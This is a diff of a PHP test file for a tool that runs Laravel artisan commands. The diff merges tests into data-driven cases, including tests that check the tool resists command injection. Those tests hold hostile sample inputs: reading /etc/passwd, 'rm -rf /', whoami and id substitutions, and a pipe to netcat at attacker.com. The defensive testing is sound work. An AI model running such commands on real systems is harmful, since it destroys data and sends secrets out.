@@ -48,17 +48,11 @@ describe('tool metadata', function () {
             ['command'],
         );
 
-        expect($this->tool->description())->toContain('background');
-    });
-
-    it('declares timeout as integer type', function () {
         $schema = $this->tool->parametersSchema();
-        expect($schema['properties']['timeout']['type'])->toBe('integer');
-    });
 
-    it('declares background as boolean type', function () {
-        $schema = $this->tool->parametersSchema();
-        expect($schema['properties']['background']['type'])->toBe('boolean');
+        expect($this->tool->description())->toContain('background')
+            ->and($schema['properties']['timeout']['type'])->toBe('integer')
+            ->and($schema['properties']['background']['type'])->toBe('boolean');
     });
 });
 
@@ -77,32 +71,17 @@ describe('input validation', function () {
         expect((string) $result)->toContain('Error');
     });
 
-    it('strips php artisan prefix', function () {
+    it('strips optional artisan prefixes', function (string $command) {
         Process::fake([
             '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
         ]);
 
-        $result = $this->tool->execute(['command' => 'php artisan route:list']);
+        $result = $this->tool->execute(['command' => $command]);
         expect((string) $result)->toBe(ARTISAN_ROUTES_OUTPUT);
-    });
-
-    it('strips artisan prefix without php', function () {
-        Process::fake([
-            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
-        ]);
-
-        $result = $this->tool->execute(['command' => 'artisan route:list']);
-        expect((string) $result)->toBe(ARTISAN_ROUTES_OUTPUT);
-    });
-
-    it('rejects artisan-only command that becomes empty after parsing', function () {
-        Process::fake([
-            '*' => Process::result(output: '', errorOutput: ARTISAN_COMMAND_NOT_FOUND, exitCode: 1),
-        ]);
-
-        $result = $this->tool->execute(['command' => '  ']);
-        expect((string) $result)->toContain('Error');
-    });
+    })->with([
+        'php artisan' => ['php artisan route:list'],
+        'artisan' => ['artisan route:list'],
+    ]);
 });
 
 describe('foreground execution', function () {
@@ -153,77 +132,36 @@ describe('foreground execution', function () {
             ->and((string) $result)->toContain('partial output');
     });
 
-    it('uses default timeout of 30 seconds', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'test:cmd']);
-
-        Process::assertRan(function ($process) {
-            $command = is_array($process->command) ? implode(' ', $process->command) : $process->command;
-
-            return str_contains($command, 'test:cmd');
-        });
-    });
 });
 
 describe('timeout parameter', function () {
-    it('accepts custom timeout', function () {
+    it('normalizes the foreground timeout', function (mixed $timeout, int $expected) {
         Process::fake([
             '*' => Process::result('done'),
         ]);
 
-        $result = $this->tool->execute([
-            'command' => 'long:cmd',
-            'timeout' => 120,
-        ]);
+        $arguments = ['command' => 'test:cmd'];
 
-        expect((string) $result)->toBe('done');
-    });
+        if ($timeout !== null) {
+            $arguments['timeout'] = $timeout;
+        }
 
-    it('clamps timeout to minimum of 1 second', function () {
-        Process::fake([
-            '*' => Process::result('done'),
-        ]);
+        $this->tool->execute($arguments);
 
-        $result = $this->tool->execute([
-            'command' => 'quick:cmd',
-            'timeout' => 0,
-        ]);
-
-        expect((string) $result)->toBe('done');
-    });
-
-    it('clamps timeout to maximum of 300 seconds', function () {
-        Process::fake([
-            '*' => Process::result('done'),
-        ]);
-
-        $result = $this->tool->execute([
-            'command' => 'slow:cmd',
-            'timeout' => 999,
-        ]);
-
-        expect((string) $result)->toBe('done');
-    });
-
-    it('falls back to default for non-integer timeout', function () {
-        Process::fake([
-            '*' => Process::result('done'),
-        ]);
-
-        $result = $this->tool->execute([
-            'command' => 'test:cmd',
-            'timeout' => 'fast',
-        ]);
-
-        expect((string) $result)->toBe('done');
-    });
+        Process::assertRan(fn ($process): bool => $process->timeout === $expected);
+    })->with([
+        'default' => [null, 30],
+        'custom' => [120, 120],
+        'minimum clamp' => [0, 1],
+        'maximum clamp' => [999, 300],
+        'non-integer fallback' => ['fast', 30],
+    ]);
 });
 
 describe('background execution', function () {
-    it('returns dispatch_id immediately', function () {
+    it('dispatches once and returns the polling contract without starting a process', function () {
+        Process::fake();
+
         $dispatch = new OperationDispatch([
             'id' => 'op_bg_migrate123',
             'task' => ARTISAN_MIGRATE_COMMAND,
@@ -232,10 +170,10 @@ describe('background execution', function () {
 
         $this->backgroundService->shouldReceive('dispatch')
             ->once()
-            ->with('migrate', null)
+            ->with('migrate', 42)
             ->andReturn($dispatch);
 
-        $this->actingAs(User::factory()->make());
+        $this->actingAs(User::factory()->make(['id' => 42]));
 
         $result = $this->tool->execute([
             'command' => 'migrate',
@@ -245,49 +183,10 @@ describe('background execution', function () {
 
         expect($data)->not->toBeNull()
             ->and($data['status'])->toBe('dispatched')
-            ->and($data['dispatch_id'])->toStartWith('op_')
-            ->and($data['command'])->toBe(ARTISAN_MIGRATE_COMMAND);
-    });
-
-    it('returns message with dispatch instructions', function () {
-        $dispatch = new OperationDispatch([
-            'id' => 'op_bg_migrate456',
-            'task' => ARTISAN_MIGRATE_COMMAND,
-            'status' => 'queued',
-        ]);
-
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andReturn($dispatch);
-
-        $result = $this->tool->execute([
-            'command' => 'migrate',
-            'background' => true,
-        ]);
-        $data = json_decode((string) $result, true);
-
-        expect($data['message'])->toContain('delegation_status');
-    });
-
-    it('does not execute process for background commands', function () {
-        Process::fake();
-
-        $dispatch = new OperationDispatch([
-            'id' => 'op_bg_no_exec',
-            'task' => ARTISAN_MIGRATE_COMMAND,
-            'status' => 'queued',
-        ]);
-
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andReturn($dispatch);
-
-        $this->tool->execute([
-            'command' => 'migrate',
-            'background' => true,
-        ]);
-
-        Process::assertDidntRun(ARTISAN_MIGRATE_COMMAND);
+            ->and($data['dispatch_id'])->toBe('op_bg_migrate123')
+            ->and($data['command'])->toBe(ARTISAN_MIGRATE_COMMAND)
+            ->and($data['message'])->toContain('delegation_status');
+        Process::assertNothingRan();
     });
 
     it('returns policy_denied for disallowed commands', function () {
@@ -325,26 +224,6 @@ describe('background execution', function () {
         expect($data['command'])->toBe(ARTISAN_MIGRATE_SEED_COMMAND);
     });
 
-    it('ignores timeout when background is true', function () {
-        $dispatch = new OperationDispatch([
-            'id' => 'op_bg_timeout',
-            'task' => ARTISAN_MIGRATE_COMMAND,
-            'status' => 'queued',
-        ]);
-
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andReturn($dispatch);
-
-        $result = $this->tool->execute([
-            'command' => 'migrate',
-            'background' => true,
-            'timeout' => 120,
-        ]);
-        $data = json_decode((string) $result, true);
-
-        expect($data['status'])->toBe('dispatched');
-    });
 });
 
 describe('output format', function () {
@@ -381,66 +260,33 @@ describe('output format', function () {
         expect((string) $result)->toBe('stderr only');
     });
 
-    it('returns valid JSON for background execution', function () {
-        $dispatch = new OperationDispatch([
-            'id' => 'op_bg_json',
-            'task' => 'php artisan migrate',
-            'status' => 'queued',
-        ]);
-
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andReturn($dispatch);
-
-        $result = $this->tool->execute([
-            'command' => 'migrate',
-            'background' => true,
-        ]);
-
-        expect(json_decode((string) $result, true))->not->toBeNull();
-    });
 });
 
 describe('command injection resistance', function () {
-    it('passes shell metacharacters as inert argv tokens, not shell commands', function () {
-        assertArtisanCommandArgv(
-            $this->tool,
+    it('tokenizes commands into inert argv', function (string $command, array $expectedArguments) {
+        assertArtisanCommandArgv($this->tool, $command, $expectedArguments);
+    })->with([
+        'backticks' => [
             'tinker --execute="echo `whoami`"',
             ['tinker', '--execute=echo `whoami`'],
-        );
-    });
-
-    it('does not split on semicolons into separate commands', function () {
-        assertArtisanCommandArgv(
-            $this->tool,
+        ],
+        'semicolon' => [
             'route:list; cat /etc/passwd',
             ['route:list;', 'cat', '/etc/passwd'],
-        );
-    });
-
-    it('does not interpret && or || as shell operators', function () {
-        assertArtisanCommandArgv(
-            $this->tool,
+        ],
+        'logical operators' => [
             'cache:clear && rm -rf /',
             ['cache:clear', '&&', 'rm', '-rf', '/'],
-        );
-    });
-
-    it('does not expand $(...) command substitutions', function () {
-        assertArtisanCommandArgv(
-            $this->tool,
+        ],
+        'command substitution' => [
             'tinker --execute="$(id)"',
             ['tinker', '--execute=$(id)'],
-        );
-    });
-
-    it('strips quotes and keeps a quoted value with spaces in one token', function () {
-        assertArtisanCommandArgv(
-            $this->tool,
+        ],
+        'quoted values' => [
             "migrate --seed --path='database/migrations' --name=\"two words\"",
             ['migrate', '--seed', '--path=database/migrations', '--name=two words'],
-        );
-    });
+        ],
+    ]);
 
     it('handles unmatched opening quote without crashing', function () {
         Process::fake([
@@ -455,61 +301,26 @@ describe('command injection resistance', function () {
         });
     });
 
-    it('always passes an array to Process::run, never a string', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'route:list']);
-
-        Process::assertRan(function ($process) {
-            return is_array($process->command)
-                && $process->command[0] === 'php'
-                && $process->command[1] === 'artisan';
-        });
-    });
 });
 
 describe('background command allowlist security', function () {
-    it('rejects shell metacharacters in background commands', function () {
+    it('rejects unsafe background commands', function (string $command) {
         $this->backgroundService->shouldReceive('dispatch')
             ->once()
             ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
 
         $result = $this->tool->execute([
-            'command' => 'migrate; cat /etc/passwd',
+            'command' => $command,
             'background' => true,
         ]);
 
         expect((string) $result)->toContain('Error')
             ->and((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
-    });
-
-    it('rejects pipe operators in background commands', function () {
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
-
-        $result = $this->tool->execute([
-            'command' => 'migrate | nc attacker.com 4444',
-            'background' => true,
-        ]);
-
-        expect((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
-    });
-
-    it('rejects command substitution in background commands', function () {
-        $this->backgroundService->shouldReceive('dispatch')
-            ->once()
-            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
-
-        $result = $this->tool->execute([
-            'command' => 'migrate $(whoami)',
-            'background' => true,
-        ]);
-
-        expect((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
-    });
+    })->with([
+        'semicolon' => ['migrate; cat /etc/passwd'],
+        'pipe' => ['migrate | nc attacker.com 4444'],
+        'command substitution' => ['migrate $(whoami)'],
+    ]);
 
     it('matches allowlist entries only at a command-namespace boundary', function () {
         $service = new BackgroundCommandService;
